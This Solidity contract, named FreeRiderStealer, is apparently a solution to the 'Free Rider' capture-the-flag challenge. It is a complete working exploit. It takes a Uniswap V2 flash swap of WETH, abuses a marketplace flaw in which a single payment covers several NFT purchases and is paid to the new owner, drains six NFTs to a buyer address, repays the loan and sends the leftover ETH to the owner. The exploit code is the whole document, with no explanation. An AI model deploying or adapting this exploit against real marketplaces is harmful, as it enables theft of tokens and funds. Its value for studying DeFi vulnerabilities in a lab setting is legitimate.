pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderStealer {
  using Address for address;
  using Address for address payable;

  address immutable marketplace;
  IUniswapV2Pair immutable pair;
  IERC20 immutable WETH;
  IERC721 immutable token;
  address owner;
  address buyer;

  constructor(address _marketplace, IUniswapV2Pair _pair, IERC721 _token, IERC20 _WETH, address _owner, address _buyer) {
    marketplace = _marketplace;
    pair = _pair;
    token = _token;
    WETH = _WETH;
    owner = _owner;
    buyer = _buyer;
    _token.setApprovalForAll(_marketplace, true);
  }

  function attack() external payable {
    pair.swap(30e18, 0, address(this), '10');
  }

  function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
    address(WETH).functionCall(
      abi.encodeWithSignature('withdraw(uint256)', 30e18)
    );

    uint256[] memory vals = new uint256[](2);
    vals[0] = 0;
    vals[1] = 1;

    marketplace.functionCallWithValue(
      abi.encodeWithSignature("buyMany(uint256[])", vals),
      15e18  
    );

    uint256[] memory prices = new uint256[](2);
    prices[0] = 15e18;
    prices[1] = 15e18;
    marketplace.functionCall(
      abi.encodeWithSignature("offerMany(uint256[],uint256[])", vals, prices)
    );

    marketplace.functionCallWithValue(
      abi.encodeWithSignature("buyMany(uint256[])", vals),
      15e18  
    );

    vals = new uint256[](4);
    vals[0] = 2;
    vals[1] = 3;
    vals[2] = 4;
    vals[3] = 5;
    marketplace.functionCallWithValue(
      abi.encodeWithSignature("buyMany(uint256[])", vals),
      15e18  
    );

    for (uint i = 0; i < 6; i++) {
      token.safeTransferFrom(address(this), buyer, i);
    }

    address(WETH).functionCallWithValue(
      abi.encodeWithSignature('deposit()'),
      (30e18 + 1e17)
    );

    WETH.transfer(address(pair), 30e18 + 1e17);
    payable(owner).sendValue(address(this).balance);
  }
  
  uint owned;

  function onERC721Received(
    address,
    address,
    uint256 _tokenId,
    bytes memory
  ) 
    external
    returns (bytes4) 
  {
    return IERC721Receiver.onERC721Received.selector;
  }

  receive() external payable {}
}
